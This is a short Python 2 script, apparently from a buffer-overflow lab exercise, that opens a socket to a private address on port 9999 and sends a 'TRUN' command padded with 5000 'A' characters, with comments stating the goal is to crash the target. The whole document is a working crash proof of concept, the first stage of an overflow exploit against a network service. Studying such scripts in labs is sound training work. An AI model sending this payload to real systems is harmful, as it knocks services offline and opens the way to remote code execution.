#!/usr/bin/python

import socket

buff = "TRUN /.:/" #command to be sent
buff += "A" * 5000 #to crash

s = socket.socket( socket.AF_INET, socket.SOCK_STREAM ) # creating the socket
s.connect(("192.168.0.156",9999)) #connect to the target
print s.recv(1024) #print response
s.send(buff) #send the stage
s.close() #close socket
